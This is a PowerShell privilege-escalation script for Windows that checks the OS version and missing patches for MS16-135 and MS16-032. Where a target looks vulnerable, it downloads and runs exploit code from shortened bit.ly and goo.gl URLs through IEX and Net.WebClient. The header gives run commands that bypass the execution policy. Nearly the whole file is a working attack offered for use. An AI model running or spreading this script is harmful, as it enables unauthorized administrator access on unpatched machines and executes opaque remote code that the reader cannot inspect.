<#
    File: EscalateMe.ps1
    Author: @xillwillx
    License: GNU General Public License v3.0
	PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Import-Module -Name ./EscalateMe.ps1; MS16-032}"
	PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Import-Module -Name ./EscalateMe.ps1; Exploit-All}"
#>

function Exploit-All {
        #MS10-015 not all of these implemented yet...
        #MS10-092
        #MS13-053
        #MS13-081
        #MS14-058
        #MS15-051
        #MS15-078
        #MS16-016
        MS16-135
        MS16-032
}


function Get-OSVersion {
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
}

#######################################################################################################################################
# CVE-2016-7255 / MS16-135  Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' PrivEsc
# Based on the work of @FuzzySec & @TinySecEx
# https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
# Win7  / Windows Server 2008 R2 SP1 - KB3197867
# Win8  / Windows Server 2012 - KB3197876 
# Win8.1/ Windows Server 2012 R2 - KB3197873
# Win10 - Pre Anniversary Edition Build 14393
#######################################################################################################################################

function MS16-135{
    	Get-OSVersion
	echo "[?] Checking for MS16-135"
  switch ($OSMajorMinor)
  {
	'10.0' # Win10 / 2k16
	{	echo "[?] Target is Win 10 `n[+] Checking for Pre-Anniversary Edition Build"
		if((!([System.IntPtr]::Size -ne 8)) -And ($OSVersion.Build -lt 14393)){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.3' # Win8.1 / 2k12R2
	{	echo "[?] Target is Win 8.1 `n[+] Checking if x64 and for KB3197873 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197873 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.2' # Win8 / 2k12
	{	echo "[?] Target is Win 8 `n[+] Checking x64 and for KB3197876 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197876 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}

	'6.1' # Win7 / 2k8R2
	{	 echo "[?] Target is Win 7 `n[+] Checking x64 and for KB3197867 patch"
		if((!([System.IntPtr]::Size -ne 8)) -And (!(get-hotfix -id KB3197867 -ea 0))){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2oQYZ1H')}else{"[x] Not Exploitable!"}
	}
  }
}

#######################################################################################################################################
# CVE-2016-0099 / MS16-032 - Secondary Logon Elevation of Privilege Vulnerability
# Based on the work of @FuzzySec & @tiraniddo
# https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
# https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html
# Windows 7 SP1 / Windows Server 2008 & R2 SP1 / Windows 8 & 8.1 / Windows Server 2012 & R2 / Windows 10 - Pre-Anniversary Build 14393
#######################################################################################################################################

function MS16-032{
	Get-OSVersion
	echo "[?] Checking for CVE-2016-0099 / MS16-032 - Secondary Logon PrivEsc Vuln"
	if (!($([System.Environment]::ProcessorCount) -eq 1)){"[+] CPU core count=$([System.Environment]::ProcessorCount)";
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{echo "[?] Target is Win 10";if($OSVersion.Build -lt 14393){"[!] Pre-Anniversary Build"}else{"[x] Patched, Not Exploitable!";return;}}

		'6.3' # Win8.1 / 2k12R2
		{echo "[?] Target is Win 8.1"}

		'6.2' # Win8 / 2k12
		{echo "[?] Target is Win 8"}

		'6.1' # Win7 / 2k8R2
		{echo "[?] Target is Win 7"}
	}
		if(!(get-hotfix -id KB3139914 -ea 0)){"[!] Hotfix not found, Exploiting!";IEX (New-Object Net.WebClient).DownloadString('https://goo.gl/wrlBsL');Invoke-ms16-032}else{"[x] Not Exploitable!"}
	}else
	{"[x] race condition requires at least 2 CPU cores, not exploitable"}
}
